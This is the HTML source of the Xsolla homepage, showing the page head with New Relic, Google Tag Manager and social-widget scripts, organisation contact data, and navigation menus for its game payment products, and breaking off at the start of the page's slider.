<!DOCTYPE html>
<html class="no-js" lang="en-US" xmlns:og="http://ogp.me/ns#"
      prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
<head>
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Xsolla</title>


    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <link rel="shortcut icon"  href="//cdn.xsolla.net/xsolla-live/img/favicon.ico">
    
<!-- BEGIN Metadata added by the Add-Meta-Tags WordPress plugin -->
<meta name="yandex-verification" content="719e29fcda8d997c" />
<meta name="verify-paysera" content="c435914a5a36b70d6bd5703ef4775d4a" />
<!-- END Metadata added by the Add-Meta-Tags WordPress plugin -->

<meta name="og:url" content=https://xsolla.com/><meta name="og:type" content="webiste" /><meta name="og:description" content="Xsolla is an authorized global distributor of video game software, providing clients with advanced technical tools to enhance their games’ potential reach worldwide."/><meta name="og:title" content="Xsolla"/><meta name="og:image" content=https://xsolla.com/app/uploads/2014/09/sharing_home_page@2x.png><link rel='dns-prefetch' href='//ajax.googleapis.com'>
<link rel='dns-prefetch' href='//cdnjs.cloudflare.com'>
<link rel='dns-prefetch' href='//cdn.xsolla.net'>
<link rel='dns-prefetch' href='//s.w.org'>
<!-- This site is powered by Shareaholic - https://shareaholic.com -->
<script type='text/javascript' data-cfasync='false'>
  //<![CDATA[
    _SHR_SETTINGS = {"endpoints":{"local_recs_url":"http:\/\/xsolla.com\/wp\/wp-admin\/admin-ajax.php?action=shareaholic_permalink_related"}};
  //]]>
</script>
<script type='text/javascript' data-cfasync='false'
        src='//dsms0mj1bbhn4.cloudfront.net/assets/pub/shareaholic.js'
        data-shr-siteid='3100b6357ef60dd2dfec322d9cf32805' async='async' >
</script>

<!-- Shareaholic Content Tags -->
<meta name='shareaholic:site_name' content='Xsolla' />
<meta name='shareaholic:language' content='en-US' />
<meta name='shareaholic:site_id' content='3100b6357ef60dd2dfec322d9cf32805' />
<meta name='shareaholic:wp_version' content='7.8.0.4' />

<!-- Shareaholic Content Tags End -->
<link rel="stylesheet" href="//cdn.xsolla.net/xsolla-live/css/main.css?ver=2fd9c22b54c38c828c8458e45f222f88">
<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js?ver=2.2.4'></script>
<link rel='https://api.w.org/' href='http://xsolla.com/wp-json/' />
<meta name="generator" content="WPML ver:3.1.6 stt:1,61,3,28,47,29;0" />
<link rel="alternate" hreflang="en-US" href="http://xsolla.com/" />
<link rel="alternate" hreflang="ko-KR" href="http://xsolla.com/ko/" />
<link rel="alternate" hreflang="zh-CN" href="http://xsolla.com/zh-hans/" />
<link rel="alternate" hreflang="de-DE" href="http://xsolla.com/de/" />
<link rel="alternate" hreflang="ru-RU" href="http://xsolla.com/ru/" />

<style type="text/css">						#lang_sel_footer ul li a[href*="/ja/"], #lang_sel_footer ul li a[href*="/ja/"]:visited {
    display: none;
}			
						#lang_sel_footer ul li a[href*="/de/"], #lang_sel_footer ul li a[href*="/de/"]:visited {
    display: none;
}																											
</style><script>window.jQuery || document.write('<script src="http://xsolla.com/app/themes/roots/assets/bower/jquery/dist/jquery.min.js"><\/script>')</script>
	<link rel="canonical" href="http://xsolla.com/">
    <script type="text/javascript">
        window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(t){try{s.console&&console.log(t)}catch(e){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,e,n){r(n.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,e){return t}).join(", ")))},{}],2:[function(t,e,n){function r(t,e,n,r,o){try{d?d-=1:i("err",[o||new UncaughtException(t,e,n)])}catch(s){try{i("ierr",[s,(new Date).getTime(),!0])}catch(c){}}return"function"==typeof f&&f.apply(this,a(arguments))}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function o(t){i("err",[t,(new Date).getTime()])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=window.onerror,u=!1,d=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(l){"stack"in l&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),u=!0)}s.on("fn-start",function(t,e,n){u&&(d+=1)}),s.on("fn-err",function(t,e,n){u&&(this.thrown=!0,o(n))}),s.on("fn-end",function(){u&&!this.thrown&&d>0&&(d-=1)}),s.on("internal-error",function(t){i("ierr",[t,(new Date).getTime(),!0])})},{}],3:[function(t,e,n){t("loader").features.ins=!0},{}],4:[function(t,e,n){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState";t("loader").features.stn=!0,t(6);var g=NREUM.o.EV;o.on(m,function(t,e){var n=t[0];n instanceof g&&(this.bstStart=Date.now())}),o.on(w,function(t,e){var n=t[0];n instanceof g&&i("bst",[n,e,this.bstStart,Date.now()])}),a.on(m,function(t,e,n){this.bstStart=Date.now(),this.bstType=n}),a.on(w,function(t,e){i(v,[e,this.bstStart,Date.now(),this.bstType])}),s.on(m,function(){this.bstStart=Date.now()}),s.on(w,function(t,e){i(v,[e,this.bstStart,Date.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=Date.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,!1),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,e,n){function r(t){for(var e=t;e&&!e.hasOwnProperty(u);)e=Object.getPrototypeOf(e);e&&o(e)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,e){return t[1]}var a=t("ee").get("events"),s=t(17)(a),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";e.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,e){if(t[1]){var n=t[1];if("function"==typeof n){var r=c(n,"nr@wrapped",function(){return s(n,"fn-",null,n.name||"anonymous")});this.wrapped=t[1]=r}else"function"==typeof n.handleEvent&&s.inPlace(n,["handleEvent"],"fn-")}}),a.on(d+"-start",function(t){var e=this.wrapped;e&&(t[1]=e)})},{}],6:[function(t,e,n){var r=t("ee").get("history"),o=t(17)(r);e.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,e,n){var r=t("ee").get("raf"),o=t(17)(r),i="equestAnimationFrame";e.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,e,n){function r(t,e,n){t[0]=a(t[0],"fn-",null,n)}function o(t,e,n){this.method=n,this.timerDuration="number"==typeof t[1]?t[1]:0,t[0]=a(t[0],"fn-",this,n)}var i=t("ee").get("timer"),a=t(17)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";e.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,e,n){function r(t,e){d.inPlace(e,["onreadystatechange"],"fn-",s)}function o(){var t=this,e=u.context(t);t.readyState>3&&!e.resolved&&(e.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,w,"fn-",s)}function i(t){v.push(t),h&&(g=-g,b.data=g)}function a(){for(var t=0;t<v.length;t++)r([],v[t]);v.length&&(v=[])}function s(t,e){return e}function c(t,e){for(var n in t)e[n]=t[n];return e}t(5);var f=t("ee"),u=f.get("xhr"),d=t(17)(u),l=NREUM.o,p=l.XHR,h=l.MO,m="readystatechange",w=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],v=[];e.exports=u;var y=window.XMLHttpRequest=function(t){var e=new p(t);try{u.emit("new-xhr",[e],e),e.addEventListener(m,o,!1)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}return e};if(c(p,y),y.prototype=p.prototype,d.inPlace(y.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,e){r(t,e),i(e)}),u.on("open-xhr-start",r),h){var g=1,b=document.createTextNode(g);new h(a).observe(b,{characterData:!0})}else f.on("fn-end",function(t){t[0]&&t[0].type===m||a()})},{}],10:[function(t,e,n){function r(t){var e=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!e.aborted){if(n.duration=(new Date).getTime()-this.startTime,4===t.readyState){e.status=t.status;var i=o(t,this.lastSize);if(i&&(n.rxSize=i),this.sameOrigin){var a=t.getResponseHeader("X-NewRelic-App-Data");a&&(e.cat=a.split(", ").pop())}}else e.status=0;n.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[e,n,this.startTime])}}}function o(t,e){var n=t.responseType;if("json"===n&&null!==e)return e;var r="arraybuffer"===n||"blob"===n||"json"===n?t.response:t.responseText;return h(r)}function i(t,e){var n=c(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.sameOrigin=n.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var e=this;e.totalCbs=0,e.called=0,e.cbTime=0,e.end=r,e.ended=!1,e.xhrGuids={},e.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){e.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,e){var n=this.metrics,r=t[0],o=this;if(n&&r){var i=h(r);i&&(n.txSize=i)}this.startTime=(new Date).getTime(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof e.onload))&&o.end(e)}catch(n){try{f.emit("internal-error",[n])}catch(r){}}};for(var a=0;a<d;a++)e.addEventListener(u[a],this.listener,!1)}),f.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),f.on("xhr-load-added",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],e)}),f.on("removeEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],e)}),f.on("fn-start",function(t,e,n){e instanceof m&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=(new Date).getTime()))}),f.on("fn-end",function(t,e){this.xhrCbStart&&f.emit("xhr-cb-time",[(new Date).getTime()-this.xhrCbStart,this.onload,e],e)})}},{}],11:[function(t,e,n){e.exports=function(t){var e=document.createElement("a"),n=window.location,r={};e.href=t,r.port=e.port;var o=e.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=e.hostname||n.hostname,r.pathname=e.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!e.protocol||":"===e.protocol||e.protocol===n.protocol,a=e.hostname===document.domain&&e.port===n.port;return r.sameOrigin=i&&(!e.hostname||a),r}},{}],12:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(s(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var u=["setPageViewName","setCustomAttribute","finished","addToTrace","inlineHit"],d="api-",l=d+"ixn-";a(u,function(t,e){f[e]=o(d+e,!0,"api")}),f.addPageAction=o(d+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var p=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[Date.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){p[e]=o(l+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],13:[function(t,e,n){e.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(e){return}}}},{}],14:[function(t,e,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),e.exports=r},{}],15:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],16:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],17:[function(t,e,n){function r(t){return!(t&&"function"==typeof t&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;e.exports=function(t){function e(t,e,n,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof n?n(r,a):n||{}}catch(u){d([u,"",[r,a,o],s])}f(e+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(l){throw f(e+"err",[r,a,l],s),l}finally{f(e+"end",[r,a,c],s)}}return r(t)?t:(e||(e=""),nrWrapper[a]=t,u(t,nrWrapper),nrWrapper)}function n(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function f(e,n,r){if(!c){c=!0;try{t.emit(e,n,r)}catch(o){d([o,e,n,r])}c=!1}}function u(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){d([r])}for(var o in t)s.call(t,o)&&(e[o]=t[o]);return e}function d(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=o),e.inPlace=n,e.flag=a,e}},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?s(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=l(n),s=a.length,c=0;c<s;c++)a[c].apply(i,r);var u=f[w[n]];return u&&u.push([v,n,r,i]),i}function d(t,e){m[t]=l(t).concat(e)}function l(t){return m[t]||[]}function p(t){return u[t]=u[t]||o(n)}function h(t,e){c(t,function(t,n){e=e||"feature",w[n]=e,e in f||(f[e]=[])})}var m={},w={},v={on:d,emit:n,get:p,listeners:l,context:e,buffer:h};return v}function i(){return new r}var a="nr@context",s=t("gos"),c=t(15),f={},u={},d=e.exports=o();d.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!g++){var t=y.info=NREUM.info,e=u.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){c(w,function(e,n){t[e]||(t[e]=n)});var n="https"===m.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",s("mark",["onload",a()],null,"api");var r=u.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===u.readyState&&i()}function i(){s("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var s=t("handle"),c=t(15),f=window,u=f.document,d="addEventListener",l="attachEvent",p=f.XMLHttpRequest,h=p&&p.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:p,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(12);var m=""+location,w={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-963.min.js"},v=p&&h&&h[d]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:m,features:{},xhrWrappable:v};u[d]?(u[d]("DOMContentLoaded",i,!1),f[d]("load",r,!1)):(u[l]("onreadystatechange",o),f[l]("onload",r)),s("mark",["firstbyte",a()],null,"api");var g=0},{}]},{},["loader",2,10,4,3]);
        ;NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"008a2beb0f",applicationID:"27463042",sa:1}
    </script>
    <script>
        window.___gcfg = {
            lang: 'en-US'
        };
    </script>
    <script type="application/ld+json">
        {
          "@context": "http://schema.org",
          "@type": "Organization",
          "url": "https://www.xsolla.com",
          "logo": "//cdn.xsolla.net/xsolla-live/img/xsolla-logo.jpg",
          "sameAs" : [
            "https://www.facebook.com/xsollausa",
            "https://www.twitter.com/xsolla",
            "https://plus.google.com/u/0/+Xsolla/posts",
            "https://www.linkedin.com/company/xsolla",
            "http://instagram.com/xsolla_inc/"
          ],
          "contactPoint" : [
              {
                "@type" : "ContactPoint",
                "telephone" : "+1-877-797-65-52",
                "contactType" : "customer service",
                "contactOption" : "TollFree",
                "areaServed" : ["US","CA"]
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+7-800-200-2729",
                "contactType" : "customer service",
                "contactOption" : "TollFree",
                "areaServed" : ["RU","KZ"]
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+380-44-379-18-79",
                "contactType" : "customer service",
                "contactOption" : "TollFree",
                "areaServed" : "UA"
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+375-820-0071-27-29",
                "contactType" : "customer service",
                "contactOption" : "TollFree",
                "areaServed" : ["BY","UA"]
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+58-800-100-9216",
                "contactType" : "customer service",
                "contactOption" : "TollFree",
                "areaServed" : "VE"
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+90-800-8529-5222",
                "contactType" : "customer service",
                "contactOption" : "TollFree",
                "areaServed" : "TR"
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+1-818-435-6613",
                "contactType" : "sales"
              },
              {
                "@type" : "ContactPoint",
                "telephone" : "+1-818-435-6613",
                "contactType" : "customer service"
              }
          ]
        }
    </script>
    <link rel="alternate" type="application/rss+xml" title="Xsolla Feed"
          href="http://xsolla.com/feed/">
</head><body class="home page page-template page-template-template-home-b page-template-template-home-b-php">

<script>
    function getCookie(name) {
        var matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    }
    var corpCookie = getCookie('first_visit');
    dataLayer = [{
        'visitCookie': corpCookie
    }];
</script>
<script src="https://apis.google.com/js/plusone.js#ver=12309108" async defer>
</script>
<script type="text/javascript" src="//vk.com/js/api/openapi.js?116"></script>
<script type="text/javascript">
    VK.init({apiId: 4738020, onlyWidgets: true});
</script>
<!-- Google Tag Manager -->
<noscript>
    <iframe src="//www.googletagmanager.com/ns.html?id=GTM-PWFSV7"
            height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<script>(function (w, d, s, l, i) {
        w[l] = w[l] || [];
        w[l].push({'gtm.start': new Date().getTime(), event: 'gtm.js'});
        var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
        j.async = true;
        j.src =
            '//www.googletagmanager.com/gtm.js?id=' + i + dl;
        f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-PWFSV7');</script>
<!-- End Google Tag Manager -->

<!--[if lt IE 8]>
<div class="alert alert-warning">
    You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your
    browser</a> to improve your experience.</div>
<![endif]-->

<div class="content" role="document">
    <div class="popup-background-dark hide"></div>
    <div class="bg-canvas">
        <div class="top"><div class="inner"></div></div>
        <div class="middle"><div class="inner"></div></div>
        <div class="bottom"><div class="inner"></div></div>
    </div>

    <div class="side-menu">
        <div class="close-arrow"></div>
        <div class="top_buttons">
            <a target="_blank" class="header_circle-link help" href="https://h.xsolla.com/"></a>
            <a target="_blank" class="header_circle-link account" href="https://publisher.xsolla.com/"></a>
        </div>
        <ul id="menu-header-left-navigation" class="menu"><li class="active dropdown menu-technology"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="/#technology">Technology <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-pay-station"><a href="http://xsolla.com/technology/paystation/">Pay Station</a></li>
	<li class="menu-mobile-pay-station"><a href="http://xsolla.com/technology/mobile-paystation/">Mobile Pay Station</a></li>
	<li class="menu-pay2play"><a href="http://xsolla.com/technology/pay2play/">Pay2Play</a></li>
	<li class="menu-unity-sdk"><a href="http://xsolla.com/technology/unity-sdk/">Unity SDK</a></li>
	<li class="menu-antifraud"><a href="http://xsolla.com/antifraud/">Antifraud</a></li>
</ul>
</li>
<li class="active dropdown menu-modules"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="/#modules">Modules <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-analytics"><a href="http://xsolla.com/modules/analytics/">Analytics</a></li>
	<li class="menu-game-store"><a href="http://xsolla.com/modules/game-store/">Game Store</a></li>
	<li class="menu-payments"><a href="http://xsolla.com/modules/payments/">Payments</a></li>
	<li class="menu-support"><a href="http://xsolla.com/modules/support/">Support</a></li>
	<li class="menu-xsolla-network"><a href="http://xsolla.com/modules/xsolla-network/">Xsolla Network</a></li>
</ul>
</li>
<li class="dropdown menu-company"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="http://xsolla.com/company/">Company <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-microsoft-contest"><a href="http://xsolla.com/microsoft-contest-support/">Microsoft Contest</a></li>
	<li class="menu-xsolla-capital"><a href="https://xsolla.com/capital/">Xsolla Capital</a></li>
	<li class="menu-press-kit"><a href="http://xsolla.com/company/press-kit/">Press Kit</a></li>
	<li class="menu-faq"><a href="http://xsolla.com/faq/">FAQ</a></li>
	<li class="menu-digital-tips"><a href="http://xsolla.com/company/digital-tips/">Digital Tips</a></li>
</ul>
</li>
<li class="menu-pricing"><a href="http://xsolla.com/pricing/">Pricing</a></li>
<li class="menu-documentation"><a href="https://developers.xsolla.com/index.html">Documentation</a></li>
<li class="menu-blog"><a href="http://blog.xsolla.com">Blog</a></li>
</ul>        <ul class="bottom_menu">
        </ul>
    </div>
    <main class="main" role="main">
            <script language="javascript" type="text/javascript">
        function popitup(url) {
            newwindow=window.open(url,'name','height=750,width=800');
            if (window.focus) {newwindow.focus()}
            return false;
        }
    </script>

<div class="home-page-design">
    <div class="welcome">
        <div class="welcom-background-image">
            <script language="javascript" type="text/javascript">
    function popitup(url) {
        newwindow=window.open(url,'name','height=750,width=800');
        if (window.focus) {newwindow.focus()}
        return false;
    }
</script>

<header>
    <section>
        <div class="header-logo-container">
            <div class="header-button button-menu">
                <a role="menu-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><defs><style>.cls-3{fill:#dbc2ff;}</style></defs><title>Asset 1</title><g id="Layer_2" data-name="Layer 2"><g id="menu"><g id="menu-2" data-name="menu"><g id="icon_menu"><g id="normal"><path class="cls-3" d="M24,1A23,23,0,1,1,1,24,23,23,0,0,1,24,1m0-1A24,24,0,1,0,48,24,24,24,0,0,0,24,0Z"/><rect class="cls-3" x="14" y="23" width="21" height="2" rx="1" ry="1"/><rect class="cls-3" x="14" y="15" width="21" height="2" rx="1" ry="1"/><rect class="cls-3" x="14" y="31" width="21" height="2" rx="1" ry="1"/></g></g></g></g></g></svg>
                </a>
            </div>
            <div class="header-logo">
                <a class="company-logo" href="http://xsolla.com/en/"></a>
            </div>
            <div class="header-button button-signin">
                <a href="https://publisher.xsolla.com/signup" id="merchant-xsolla"
                   target="_blank">LOG IN</a>
                <a onclick="return popitup('https://app.hubspot.com/meetings/xsolla/xsolla-product-demo-');" href="https://app.hubspot.com/meetings/xsolla/xsolla-product-demo-" target="_blank" class="schedule-demo request-form-open btn">Schedule Product Tour</a>
            </div>
        </div>
        <div class="header-menu header-menu__left">
            <ul id="menu-header-left-navigation-1" class="menu"><li class="active dropdown menu-technology"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="/#technology">Technology <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-pay-station"><a href="http://xsolla.com/technology/paystation/">Pay Station</a></li>
	<li class="menu-mobile-pay-station"><a href="http://xsolla.com/technology/mobile-paystation/">Mobile Pay Station</a></li>
	<li class="menu-pay2play"><a href="http://xsolla.com/technology/pay2play/">Pay2Play</a></li>
	<li class="menu-unity-sdk"><a href="http://xsolla.com/technology/unity-sdk/">Unity SDK</a></li>
	<li class="menu-antifraud"><a href="http://xsolla.com/antifraud/">Antifraud</a></li>
</ul>
</li>
<li class="active dropdown menu-modules"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="/#modules">Modules <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-analytics"><a href="http://xsolla.com/modules/analytics/">Analytics</a></li>
	<li class="menu-game-store"><a href="http://xsolla.com/modules/game-store/">Game Store</a></li>
	<li class="menu-payments"><a href="http://xsolla.com/modules/payments/">Payments</a></li>
	<li class="menu-support"><a href="http://xsolla.com/modules/support/">Support</a></li>
	<li class="menu-xsolla-network"><a href="http://xsolla.com/modules/xsolla-network/">Xsolla Network</a></li>
</ul>
</li>
<li class="dropdown menu-company"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="http://xsolla.com/company/">Company <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-microsoft-contest"><a href="http://xsolla.com/microsoft-contest-support/">Microsoft Contest</a></li>
	<li class="menu-xsolla-capital"><a href="https://xsolla.com/capital/">Xsolla Capital</a></li>
	<li class="menu-press-kit"><a href="http://xsolla.com/company/press-kit/">Press Kit</a></li>
	<li class="menu-faq"><a href="http://xsolla.com/faq/">FAQ</a></li>
	<li class="menu-digital-tips"><a href="http://xsolla.com/company/digital-tips/">Digital Tips</a></li>
</ul>
</li>
<li class="menu-pricing"><a href="http://xsolla.com/pricing/">Pricing</a></li>
<li class="menu-documentation"><a href="https://developers.xsolla.com/index.html">Documentation</a></li>
<li class="menu-blog"><a href="http://blog.xsolla.com">Blog</a></li>
</ul>        </div>
        <div class="header-menu header-menu__right">
                        <ul>
                <li>
                    <a class="btn" href="https://publisher.xsolla.com/" target="_blank">Publisher login</a>
                </li>
                <li>
                    <a class="schedule-demo request-form-open btn" onclick="return popitup('https://app.hubspot.com/meetings/xsolla/xsolla-product-demo-');" href="https://app.hubspot.com/meetings/xsolla/xsolla-product-demo-" target="_blank">Schedule Product Tour</a>
                </li>
            </ul>
                    </div>
    </section>
</header>
<div class="is-mobile-detector"></div>
            <div class="slider">
                <div class="carousel invisible" data-scroll-reveal="enter left and move 0px over 1s">
                    <div class="slider-panel">
                        <div class="slider-info">
